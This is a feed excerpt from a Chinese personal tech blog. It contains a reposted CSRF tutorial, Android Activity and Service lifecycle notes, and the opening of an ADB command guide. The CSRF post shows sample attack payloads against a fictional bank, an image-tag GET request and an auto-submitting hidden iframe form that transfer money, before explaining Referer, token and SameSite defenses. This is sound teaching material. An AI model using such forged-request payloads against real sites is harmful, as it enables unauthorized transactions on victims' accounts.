        <title type="html"><![CDATA[WEB攻击之_CSRF「转]]]></title>
        <id>http://wangqunsong.github.io/post/web-gong-ji-zhi-_csrfzhuan</id>
        <link href="http://wangqunsong.github.io/post/web-gong-ji-zhi-_csrfzhuan">
        </link>
        <updated>2018-12-13T14:29:19.000Z</updated>
        <summary type="html"><![CDATA[<p>👏  欢迎使用 来到小小王的后花园！<br>
✍️  这里仅仅是一个记录个人成长的地方，现在所处的位置是<strong>WEB攻击之_CSRF「转]</strong></p>
]]></summary>
        <content type="html"><![CDATA[<p>👏  欢迎使用 来到小小王的后花园！<br>
✍️  这里仅仅是一个记录个人成长的地方，现在所处的位置是<strong>WEB攻击之_CSRF「转]</strong></p>
<!-- more --> 
<p>CSRF（Cross-site request forgery，中文为<strong>跨站请求伪造</strong>）是一种利用网站可信用户的权限去执行未授权的命令的一种恶意攻击。通过<strong>伪装可信用户的请求来利用信任该用户的网站</strong>，这种攻击方式虽然不是很流行，但是却难以防范，其危害也不比其他安全漏洞小。</p>
<blockquote>
<p><a href="https://www.daguanren.cc/post/csrf-introduction.html">原文链接</a></p>
</blockquote>
<h2 id="初识csrf">初识CSRF</h2>
<p><strong>一.CSRF是什么？</strong></p>
<p>CSRF（Cross-site request<br>
forgery），中文名称：跨站请求伪造，也被称为：one click attack/session<br>
riding，缩写为：CSRF/XSRF。</p>
<p><strong>二.CSRF可以做什么？</strong></p>
<p>你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账......造成的问题包括：个人隐私泄露以及财产安全。</p>
<p><strong>三.CSRF的原理</strong></p>
<p><img src="https://www.daguanren.cc/static/upload/20171116/bwft5NhCP-bobvCOWOCrZb5q.png" alt="web-CSRF"></p>
<p>从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成两个步骤：</p>
<p>1.登录受信任网站A，并在本地生成Cookie。</p>
<p>2.在不登出A的情况下，访问危险网站B。</p>
<p><strong>四.CSRF 攻击示例</strong></p>
<p>以一个银行转账的操作作为例子（仅仅是例子，实际情况更复杂）</p>
<p><strong>示例1：</strong></p>
<p>​ 银行网站A，它以GET请求来完成银行转账的操作，如：</p>
<pre><code class="language-{.html}">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000
</code></pre>
<p>危险网站B，它里面有一段HTML的代码如下：</p>
<pre><code class="language-{.html}">&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;
</code></pre>
<p>首先，你登录了银行网站A，然后访问危险网站B，噢，这时你会发现你的银行账户少了1000块......</p>
<p>为什么会这样呢？原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，你已经登录了银行网站A，而B中的<img>以GET的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以你的浏览器会带上你的银行网站A的Cookie发出Get请求，去获取资源</p>
<pre><code class="language-{.html}">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000
</code></pre>
<p>结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作......</p>
<p><strong>示例2：</strong></p>
<p>为了杜绝上面的问题，银行决定改用POST请求完成转账操作，银行网站A的WEB表单如下：</p>
<pre><code class="language-{.html}">　&lt;form action=&quot;Transfer.php&quot; method=&quot;POST&quot;&gt;
　　　　&lt;p&gt;ToBankId: &lt;input type=&quot;text&quot; name=&quot;toBankId&quot; /&gt;&lt;/p&gt;
　　　　&lt;p&gt;Money: &lt;input type=&quot;text&quot; name=&quot;money&quot; /&gt;&lt;/p&gt;
　　　　&lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;Transfer&quot; /&gt;&lt;/p&gt;
　　&lt;/form&gt;
</code></pre>
<p>后台处理页面Transfer.php如下：</p>
<pre><code class="language-{.php}">&lt;?php
　　　　session_start();
　　　　if (isset($_REQUEST['toBankId'] &amp;&amp;　isset($_REQUEST['money']))
　　　　{
　　　　    buy_stocks($_REQUEST['toBankId'],　$_REQUEST['money']);
　　　　}
　　?&gt;
</code></pre>
<p>危险网站B，仍然只是包含那句HTML代码：</p>
<pre><code class="language-{.htm}">&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;
</code></pre>
<p>​<br>
和示例1中的操作一样，你首先登录了银行网站A，然后访问危险网站B，结果.....和示例1一样，你再次没了1000块～T_T，这次事故的原因是：银行后台使用了REQUEST去获取请求的数据，而REQUEST既可以获取GET请求的数据，也可以获取POST请求的数据，这就造成了在后台处理程序无法区分这到底是GET请求的数据还是POST请求的数据。在PHP中，可以使用GET和POST分别获取GET请求和POST请求的数据。在JAVA中，用于获取请求数据request一样存在不能区分GET请求数据和POST数据的问题。</p>
<p><strong>示例3：</strong></p>
<p>​<br>
经过前面2个惨痛的教训，银行决定把获取请求数据的方法也改了，改用$_POST，只获取POST请求的数据，后台处理页面Transfer.php代码如下：</p>
<pre><code class="language-{.php}">&lt;?php
　　　　session_start();
　　　　if (isset($_POST['toBankId'] &amp;&amp;　isset($_POST['money']))
　　　　{
　　　　    buy_stocks($_POST['toBankId'],　$_POST['money']);
　　　　}
　　?&gt;
</code></pre>
<p>然而，危险网站B与时俱进，它改了一下代码：</p>
<pre><code class="language-{.php}">&lt;html&gt;
　　&lt;head&gt;
　　　　&lt;script type=&quot;text/javascript&quot;&gt;
　　　　　　function steal()
　　　　　　{
          　　　　 iframe = document.frames[&quot;steal&quot;];
　　     　　      iframe.document.Submit(&quot;transfer&quot;);
　　　　　　}
　　　　&lt;/script&gt;
　　&lt;/head&gt;

　　&lt;body onload=&quot;steal()&quot;&gt;
　　　　&lt;iframe name=&quot;steal&quot; display=&quot;none&quot;&gt;
　　　　　　&lt;form method=&quot;POST&quot; name=&quot;transfer&quot;　action=&quot;http://www.myBank.com/Transfer.php&quot;&gt;
　　　　　　　　&lt;input type=&quot;hidden&quot; name=&quot;toBankId&quot; value=&quot;11&quot;&gt;
　　　　　　　　&lt;input type=&quot;hidden&quot; name=&quot;money&quot; value=&quot;1000&quot;&gt;
　　　　　　&lt;/form&gt;
　　　　&lt;/iframe&gt;
　　&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>​<br>
如果用户仍是继续上面的操作，很不幸，结果将会是再次不见1000块......因为这里危险网站B暗地里发送了POST请求到银行!</p>
<p>总结一下上面3个例子，CSRF主要的攻击模式基本上是以上的3种，其中以第1,2种最为严重，因为触发条件很简单，一个<img>就可以了，而第3种比较麻烦，需要使用JavaScript，所以使用的机会会比前面的少很多，但无论是哪种情况，只要触发了CSRF攻击，后果都有可能很严重。</p>
<p>理解上面的3种攻击模式，其实可以看出:</p>
<blockquote>
<p>CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！</p>
</blockquote>
<p><strong>五.CSRF 攻击的对象</strong><br>
​         在讨论如何抵御 CSRF 之前，先要明确 CSRF攻击的对象，也就是要保护的对象。从以上的例子可知，CSRF攻击是黑客借助受害者的 cookie（session）骗取服务器的信任，但是黑客并不能拿到 cookie，也看不到 cookie的内容。另外，对于服务器返回的结果，由于浏览器同源策略的限制，黑客也无法进行解析。因此，黑客无法从返回的结果中得到任何东西，他所能做的就是给服务器发送请求，以执行请求中所描述的命令，在服务器端直接改变数据的值，而非窃取服务器中的数据。所以，我们要保护的对象是那些可以直接产生数据改变的服务，而对于读取数据的服务，则不需要进行CSRF 的保护。比如银行系统中转账的请求会直接改变账户的金额，会遭到 CSRF攻击，需要保护。而查询余额是对金额的读取操作，不会改变数据，CSRF攻击无法解析服务器返回的结果，无需保护。<br>
故：增删改需要防范CSRF攻击，而读无需防范。</p>
<h2 id="当前防御-csrf-的几种策略">当前防御 CSRF 的几种策略</h2>
<p>在业界目前防御 CSRF 攻击主要有四种策略：</p>
<ol>
<li>验证 HTTP Referer 字段；</li>
<li>在请求地址中添加 token 并验证；</li>
<li>在 HTTP 头中自定义属性并验证；</li>
<li>Chrome浏览器端启用SameSite cookie</li>
</ol>
<p><strong>1、验证 HTTP Referer 字段</strong></p>
<p>什么是HTTP<br>
Referer？下面GIF图是由百度跳转到QQ邮箱页面的Referer查看示意：<img src="https://i.loli.net/2019/03/14/5c8a22b11bcb2.gif" alt="referer.gif"></p>
<p>可以看出Referer为</p>
<pre><code class="language-HTML">    Referer：https://www.baidu.com/
</code></pre>
<p>​ 根据 HTTP 协议，在 HTTP 头（request 的 header）中有一个字段叫Referer，它记录了该 HTTP 请求的来源地址。如果黑客要对银行网站实施 CSRF攻击，当用户通过黑客的网站发送请求到银行时，该请求的 Referer值是指向黑客的网站而不是用户的网站。因此，要防御 CSRF攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是www.bank.example开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</p>
<p>​ 这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查Referer的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑。</p>
<p>​ 然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP协议上有明确的要求，但是每个浏览器对于 Referer的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果www.bank.example网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer<br>
值设为以 www.bank.example域名开头的地址，这样就可以通过验证，从而进行CSRF 攻击。</p>
<p>​ 即便是使用最新的浏览器，黑客无法篡改 Referer值，这种方法仍然有问题。因为 Referer值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心Referer值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是CSRF 攻击，拒绝合法用户的访问。</p>
<p>另外，如果Referer的判断逻辑写的不严密的话，也容易被攻破，例如</p>
<pre><code class="language-HTML">    const referer = request.headers.referer;
    if (referer.indexOf('www.bank.example') &gt; -1) {
      // pass
    }
</code></pre>
<p>如果黑客的网站是www.bank.example.hack.com，则referer检查无效。</p>
<p><strong>2、在请求地址中添加 token 并验证</strong><br>
​ CSRF<br>
攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户的 cookie来通过安全验证。要抵御CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p>
<p>​ 这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的token 进行比对，但这种方法的难点在于如何把 token以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL就变成</p>
<pre><code class="language-HTML">    http://url?csrftoken=tokenvalue
</code></pre>
<p>而对于 POST 请求来说，要在 form 的最后加上</p>
<pre><code class="language-HTML">     &lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;tokenvalue&quot;/&gt;
</code></pre>
<p>​ 该方法有一个缺点是难以保证 token本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF攻击。为了避免这一点，系统可以在添加 token的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加token，如果是通向外网则不加。不过，即使这个 csrftoken不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器Referer 功能的原因。</p>
<p><strong>3、在 HTTP 头中自定义属性并验证</strong></p>
<p>​ 这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP头中自定义的属性里。通过 XMLHttpRequest这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把token 值放入其中。这样解决了上种方法在请求中加入 token的不便，同时，通过 XMLHttpRequest请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer泄露到其他网站中去。</p>
<p>​ 然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax<br>
方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p>
<p><strong>4、Chrome浏览器端启用SameSite cookie</strong></p>
<p>下面介绍如何启用SameSite cookie的设置，很简单。</p>
<p>原本的 Cookie 的 header 设置是长这样：</p>
<pre><code class="language-HTML">    Set-Cookie: session_id=esadfas325
</code></pre>
<p>需要在尾部增加 SameSite 就好：</p>
<pre><code class="language-HTML">    Set-Cookie: session_id=esdfas32e5; SameSite
</code></pre>
<p>SameSite<br>
有两种模式，Lax跟Strict模式，默认启用Strict模式，可以自己指定模式：</p>
<pre><code class="language-HTML">    Set-Cookie: session_id=esdfas32e5; SameSite=Strict
    Set-Cookie: foo=bar; SameSite=Lax
</code></pre>
<p>​ Strict模式规定 cookie 只允许相同的site使用，不应该在任何的 cross site<br>
request被加上去。即a标签、form表单和XMLHttpRequest提交的内容，只要是提交到不同的site去，就不会带上cookie。<br>
​<br>
但也存在不便，例如朋友发送过来我已经登陆过的一个页面链接，我点开后，该页面仍然需要重新登录。<br>
​<br>
有两种处理办法，第一种是与Amazon一样，准备两组不同的cookie，第一组用于维持登录状态不设定SameSite，第二组针对的是一些敏感操作会用到（例如购买、支付、设定账户等）严格设定SameSite。基于这个思路，就产生了 SameSite 的另一一种模式：Lax模式。Lax 模式打开了一些限制，例如</p>
<pre><code class="language-HTML">    &lt;a&gt;
    &lt;link rel=&quot;prerender&quot;&gt;
    &lt;form method=&quot;GET&quot;&gt;
</code></pre>
<p>这些都会带上cookie。但是 POST 方法 的 form，或是只要是 POST, PUT, DELETE这些方法，就不会带cookie。<br>
但一定注意将重要的请求方式改成POST，否则GET仍然会被攻击。<br>
PS：该方式目前仅Chrome支持。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Android_初识Android Activity的生命周期]]></title>
        <id>http://wangqunsong.github.io/post/android_-chu-shi-android-activity-de-sheng-ming-zhou-qi</id>
        <link href="http://wangqunsong.github.io/post/android_-chu-shi-android-activity-de-sheng-ming-zhou-qi">
        </link>
        <updated>2018-12-05T14:17:18.000Z</updated>
        <summary type="html"><![CDATA[<p>👏  欢迎使用 来到小小王的后花园！<br>
✍️  这里仅仅是一个记录个人成长的地方，现在所处的位置是<strong>初识Android Activity的生命周期</strong></p>
]]></summary>
        <content type="html"><![CDATA[<p>👏  欢迎使用 来到小小王的后花园！<br>
✍️  这里仅仅是一个记录个人成长的地方，现在所处的位置是<strong>初识Android Activity的生命周期</strong></p>
<!-- more -->
<h5 id="序">序</h5>
<p>先放一张Google的经典<code>Android Activity</code>生命周期图：</p>
<p><img src="https://i.loli.net/2019/04/01/5ca1b516ae754.png" alt="Android Activity生命周期"></p>
<h5 id="activity生命周期解释">Activity生命周期解释</h5>
<pre><code class="language-java">//1.onCreate()
    首次创建activity时调用，通常会在该函数中进行一些初始化操作：如创建视图，数据绑定到列表等。系统会向此方法传递一个Bundle对象，其中会包含activity的上一状态，onCreate()后始终接onStart()。
//2.onStart()
    该函数在onCreate()之后被调用，在Activity即将对用户可见之前调用。如果activity来到前台，则继续执行onResume();如果activity进入隐藏状态，则执行onStop()。
//3.onResume()
    该函数在Activity启动并来到前台，在activity即将开始与用户进行交互之前调用。此时avtivity处于Activity堆栈的顶层，并且具有用户输入的焦点，后接onPause()。
//4.onPause()
    该函数在系统即将开始继续另一个activity时被调用，此方法通常用于确认对持久数据的未保存更改，停止动画等。它应该非常迅速的执行所需操作，因为在它返回后，下一activity才能继续执行。如果activity返回前台，则之后执行onResume(),如果activity转入对用户不可见，则后接onStop()。
//5.onStop()
    该函数在Activity对用户不可见时调用，因为另一activity已继续执行并覆盖了当前的Activity。如果恢复与用户的交互，则后接onRestart(),如果activity被销毁，则后接onDestroy()。
//6.onRestart()
    在Activity()已停止并即将再次启动前调用。其后始终接onStart()。
//7.onDestory()
    当要销毁某个Activity时，调用该函数进行销毁。（有人执行了finish()或者系统为了节省空间而暂时销毁该activity实例时，都可能会调用它。可以通过isFinishing()来判断）。
</code></pre>
<h5 id="什么是activity">什么是Activity?</h5>
<blockquote>
<p>Activity是一个应用组件，用户可与其提供的屏幕进行交互，以执行拨打电话、拍摄照片、发送电子邮件或查看地图等操作。 每个 Activity 都会获得一个用于绘制其用户界面的窗口。窗口通常会充满屏幕，但也可小于屏幕并浮动在其他窗口之上。                        ------Google</p>
</blockquote>
<p>或者说，<strong>一个<code>Activity</code>通常就是一个单独的屏幕（窗口）</strong>；另外：</p>
<ul>
<li><code>Activity</code>之间通过<code>Intent</code>进行通信</li>
<li><code>android</code>应用中每一个<code>Activity</code>都必须要在<code>AndroidManifest.xml</code>配置文件中声明，否则系统将不识别也不执行该<code>Activity</code></li>
</ul>
<h5 id="activity状态">Activity状态</h5>
<ul>
<li>
<p>【继续】：或者也称为“运行”，此 Activity 位于屏幕前台并具有用户焦点；</p>
</li>
<li>
<p>【暂停】：另一个 Activity 位于屏幕前台并具有用户焦点，但此 Activity 仍可见。也就是说，另一个 Activity 显示在此 Activity 上方，并且该 Activity 部分透明或未覆盖整个屏幕。 暂停的 Activity 处于完全活动状态Activity对象保留在内存中，它保留了所有状态和成员信息，并与窗口管理器保持连接），但在内存极度不足的情况下，可能会被系统终止。</p>
</li>
<li>
<p>【停止】：该 Activity 被另一个 Activity 完全遮盖（该 Activity 目前位于“后台”）。 已停止的 Activity 同样仍处于活动状态Activity 对象保留在内存中，它保留了所有状态和成员信息，但<em>未</em>与窗口管理器连接）。 不过，它对用户不再可见，在他处需要内存时可能会被系统终止。</p>
<blockquote>
<p>注：如果 Activity 处于暂停或停止状态，系统可通过要求其结束（调用其 finish() 方法）或直接终止其进程，将其从内存中删除。（将其结束或终止后）再次打开 Activity 时，必须重建，也就是会重新调用onCreate方法。</p>
</blockquote>
</li>
</ul>
<h5 id="创建activity">创建Activity</h5>
<p>要创建Activity，就必须继承（extends）并实现其子类，以MainActivity为例：</p>
<pre><code class="language-java">public class MainActivity extends AppCompatActivity {
    private static final String TAG = &quot;MainActivity&quot;;
    long value; // 保存从A传递过来的N值
	TextView valueTextView;
	TextView running;
	TextView result;
	long fab
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (getIntent() != null &amp;&amp; getIntent().hasExtra(&quot;value&quot;)) {
			value = getIntent().getLongExtra(&quot;value&quot;, 0);
		}
        setContentView(R.layout.activity_main);
        valueTextView = (TextView) findViewById(R.id.value);
		running = (TextView) findViewById(R.id.running);
		result = (TextView) findViewById(R.id.result);

		// 将获取到的value设置到当前的valueTextView控件上去
		valueTextView.setText(value + &quot;&quot;);
		running.setVisibility(View.VISIBLE);
		new MyThread(value).start();
    }
    @Override
    protected void onStart() {
    }
    @Override
    protected void onResume() {
    }
}
</code></pre>
<p>需要在onCreate方法中使用setContengtView()方法定义当前Activity使用的界面。然后在AndroidManifest文件注册Activity：</p>
<pre><code class="language-java">        &lt;activity android:name=&quot;.MainActivity&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;

                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;
            &lt;/intent-filter&gt;
        &lt;/activity&gt;
</code></pre>
<h5 id="常见activity流程">常见Activity流程</h5>
<pre><code class="language-shell">#1.Activity正常启动过程
onCreate() -&gt; onStart() -&gt; onResume(),此时Activity获取到焦点，并展示在界面上。
#2.点击Home键
onPause() -&gt; onStop(),当前Activity失去焦点，并退到后台栈中。
#3.再次唤起Activity
onStart() -&gt; onStart() -&gt; onResume()，最终获取焦点，展示在界面上。
#4.退出该界面
onPause() -&gt; onStop() -&gt; onDestory()，Activity处于被销毁状态。
【其他流程】：
#5.用户锁屏再解锁
用户锁屏 -&gt; onPause() -&gt; onStop() -&gt; 用户解锁 -&gt; onRestart() -&gt; onStart() -&gt; onResume(),该Activity再次来到前台
#6.当前Activity退居后台，启动对话框式的Activity,返回当前Activity
onPause() -&gt; onResume(),该Activity再次回到前台
#7.用户退出应用或者被系统清理时
onPause() -&gt; onStop() -&gt; onDestory()，Activity处于被销毁状态。
</code></pre>
<h5 id="activity的四种启动模式">Activity的四种启动模式</h5>
<pre><code class="language-shell">#1.standard 模式
    Activity 启动的默认模式，可多次实例化，可以位于 Activity 堆栈中的任何位置。每次 “standard” Activity 有新的 Intent 时，系统都会创建新的类实例来响应该 Intent 。每个实例处理单个 Intent。
#2.singleTop 模式
    可多次实例化，可位于 Activity 堆栈中的任何位置，每次 “singleTop” Activity 有新的 Intent 时,如果目标任务在其堆栈顶部已有一个 Activity 实例，那么该实例将接收新Intent（通过调用 onNewIntent()）；此时不会创建新实例。如果 “singleTop” 的一个现有实例虽在目标任务内，但未处于堆栈顶部，或者虽然位于堆栈顶部，但不在目标任务中则系统会创建一个新实例并将其推送到堆栈上。
#3.singleTask 模式
    始终位于Activity堆栈的根位置，一个设备只能保留一个Activity实例，只允许一个此类任务， “singleTask” Activity 允许其他 Activity 成为其任务组成部分
#4.singleInstance 模式
    始终位于 Activity 堆栈的根位置，一个设备只能保留一个Activity实例，只允许一个此类任务， “singleInstance” Activity 不允许其他 Activity 成为其任务组成部分，它是任务中唯一的 Activity ，如果它启动另一个 Activity 系统会将该 Activity 分配给其他任务
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Android_初识Android Service]]></title>
        <id>http://wangqunsong.github.io/post/android_-chu-shi-android-service</id>
        <link href="http://wangqunsong.github.io/post/android_-chu-shi-android-service">
        </link>
        <updated>2018-11-24T14:19:25.000Z</updated>
        <summary type="html"><![CDATA[<p>👏  欢迎使用 来到小小王的后花园！<br>
✍️  这里仅仅是一个记录个人成长的地方，现在所处的位置是<strong>Android_初识Android Service</strong></p>
]]></summary>
        <content type="html"><![CDATA[<p>👏  欢迎使用 来到小小王的后花园！<br>
✍️  这里仅仅是一个记录个人成长的地方，现在所处的位置是<strong>Android_初识Android Service</strong></p>
<!-- more -->
<p><a href="https://developer.android.com/guide/components/services.html">安卓开发者中心</a></p>
<h4 id="序">序</h4>
<p>先放一张<code>Google</code>的<code>service</code>生命周期图：</p>
<p><img src="https://i.loli.net/2019/04/01/5ca1cd02dea92.png" alt="service生命周期"></p>
<h4 id="service的生命周期解释">Service的生命周期解释</h4>
<pre><code class="language-shell">#1.onCreate()
    首次创建服务时，系统将调用此方法来执行一次性设置程序（在调用 onStartCommand()或 onBind()之前）。如果服务已在运行，则不会调用此方法。
#2.onStartCommand()
    当另一个组件（如 Activity）通过调用 startService()请求启动服务时，系统将调用此方法。一旦执行此方法，服务即会启动并可在后台无限期运行。 如果您实现此方法，则在服务工作完成后，需要由您通过调用 stopSelf()或 stopService()来停止服务。（如果您只想提供绑定，则无需实现此方法。）
#3.onDestroy()
    当服务不再使用且将被销毁时，系统将调用此方法。服务应该实现此方法来清理所有资源，如线程、注册的侦听器、接收器等。 这是服务接收的最后一个调用。
#4.onBind()
    当另一个组件想通过调用 bindService()与服务绑定（例如执行 RPC）时，系统将调用此方法.
#5. onUnBind()
    解除组件与服务的绑定，对于绑定服务，有效生命周期在 onUnbind() 返回时结束
</code></pre>
<h4 id="什么是service">什么是Service?</h4>
<p><code>Service</code> 是一个可以在后台执行长时间运行操作而不提供用户界面的应用组件。服务可由其他应用组件启动，而且即使用户切换到其他应用，服务仍将在后台继续运行。</p>
<p>服务基本上分为两种形式：</p>
<ul>
<li>启动（started）</li>
</ul>
<p>​        当应用组件（如 Activity）通过调用 <code>startService()</code> 启动服务时，服务即处于“启动”状态。一旦启动，服务即可在后台无限期运行，即使启动服务的组件已被销毁也不受影响。</p>
<ul>
<li>绑定</li>
</ul>
<p>​        当应用组件通过调用 <code>bindService()</code> 绑定到服务时，服务即处于“绑定”状态。绑定服务提供了一个客户端-服务器接口，允许组件与服务进行交互、发送请求、获取结果。仅当与另一个应用组件绑定时，绑定服务才会运行。 多个组件可以同时绑定到该服务，但全部取消绑定后，该服务即会被销毁。</p>
<h4 id="startservice与bindservice区别">startService()与bindService()区别</h4>
<ul>
<li>started service（启动服务）是由其他组件调用startService()方法启动的，这导致服务的onStartCommand()方法被调用。当服务是started状态时，其生命周期与启动它的组件无关，并且可以在后台无限期运行，即使启动服务的组件已经被销毁。因此，服务需要在完成任务后调用stopSelf()方法停止，或者由其他组件调用stopService()方法停止。</li>
<li>使用bindService()方法启用服务，调用者与服务绑定在了一起，调用者一旦退出，服务也就终止，大有“不求同时生，必须同时死”的特点。</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Android_ADB操作使用手册]]></title>
        <id>http://wangqunsong.github.io/post/android_adb-cao-zuo-shi-yong-shou-ce</id>
        <link href="http://wangqunsong.github.io/post/android_adb-cao-zuo-shi-yong-shou-ce">
        </link>
        <updated>2018-11-02T14:15:26.000Z</updated>
        <summary type="html"><![CDATA[<p>👏  欢迎使用 来到小小王的后花园！<br>
✍️  这里仅仅是一个记录个人成长的地方，现在所处的位置是<strong>ADB操作使用手册</strong></p>
]]></summary>
        <content type="html"><![CDATA[<p>👏  欢迎使用 来到小小王的后花园！<br>
✍️  这里仅仅是一个记录个人成长的地方，现在所处的位置是<strong>ADB操作使用手册</strong></p>
<!-- more --> 
<h2 id="一-adb是什么">一、ADB是什么？</h2>
<p>原文链接：<a href="https://juejin.im/post/5b5683bcf265da0f9b4dea96">地址</a></p>
<p>ADB，即 <a href="https://link.juejin.im?target=https%3A%2F%2Fdeveloper.android.com%2Fstudio%2Fcommand-line%2Fadb.html">Android Debug Bridge</a> 是一种允许模拟器或已连接的 Android 设备进行通信的命令行工具，它可为各种设备操作提供便利，如安装和调试应用，并提供对 <code>Unix shell</code>（可用来在模拟器或连接的设备上运行各种命令）的访问。可以在<code>Android SDK/platform-tools</code>中找到 <code>adb</code> 工具或下载 <a href="https://link.juejin.im?target=http%3A%2F%2Fadbshell.com%2Fdownloads">ADB Kits</a> 。</p>
<p><strong>注：</strong> 有部分命令的支持情况可能与 Android 系统版本及定制 ROM 的实现有关。</p>
<h2 id="二-adb有什么作用">二、ADB有什么作用？</h2>
<p><code>ADB</code> 是 <code>Android SDK</code> 里的一个工具, 用这个工具可以直接操作管理Android模拟器或者真实的Android设备。它的主要功能有:</p>
<ul>
<li>在设备上运行Shell命令；</li>
<li>将本地APK软件安装至模拟器或Android设备；</li>
<li>管理设备或手机模拟器上的预定端口；</li>
<li>在设备或手机模拟器上复制或粘贴文件。</li>
</ul>
<p><code>ADB</code> 是一个<code>客户端-服务器程序</code>程序，包括三个组件：</p>
<ul>
<li><strong>客户端</strong>：该组件发送命令。客户端在开发计算机上运行。可以通过发出 adb 命令从命令行终端调用客户端。</li>
<li><strong>后台程序</strong>：该组件在设备上运行命令。后台程序在每个模拟器或设备实例上作为后台进程运行。</li>
<li><strong>服务器</strong>：该组件管理客户端和后台程序之间的通信。服务器在开发计算机上作为后台进程运行。</li>
</ul>
<h2 id="三-adb命令语法">三、ADB命令语法</h2>
<p>adb 命令的基本语法如下：</p>
<pre><code>adb [-d|-e|-s &lt;serial-number&gt;] &lt;command&gt;
复制代码
</code></pre>
<h3 id="单一设备模拟器连接">单一设备/模拟器连接</h3>
<p>如果只有一个设备/模拟器连接时，可以省略掉 <code>[-d|-e|-s &lt;serial-number&gt;]</code> 这一部分，直接使用 <code>adb &lt;command&gt;</code>。</p>
<h3 id="多个设备模拟器连接">多个设备/模拟器连接</h3>
<p>如果有多个设备/模拟器连接，则需要为命令指定目标设备，下表是指定目标设备的命令选项：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-d</td>
<td>指定当前唯一通过 USB 连接的 Android 设备为命令目标</td>
</tr>
<tr>
<td>-e</td>
<td>指定当前唯一运行的模拟器为命令目标</td>
</tr>
<tr>
<td><code>-s &lt;serial-number&gt;</code></td>
<td>指定相应设备序列号的设备/模拟器为命令目标</td>
</tr>
</tbody>
</table>
<p>在多个设备/模拟器连接的情况下较常用的是 <code>-s &lt;serial-number&gt;</code> 参数，<code>serial-number</code>是指设备的设备序列号，可以通过 <code>adb devices</code> 命令获取。</p>
<h2 id="四-adb常用命令">四、ADB常用命令</h2>
<h3 id="41-基本命令">4.1 基本命令</h3>
<h4 id="411-查看adb的版本信息">4.1.1 查看adb的版本信息</h4>
<pre><code>adb version
复制代码
</code></pre>
<h4 id="412-启动adb">4.1.2 启动adb</h4>
<pre><code>adb start-server
复制代码
</code></pre>
<p>一般无需手动执行此命令，在运行 adb 命令时若发现 adb server 没有启动会自动调起。</p>
<h4 id="413-停止adb">4.1.3 停止adb</h4>
<pre><code>adb kill-server
复制代码
</code></pre>
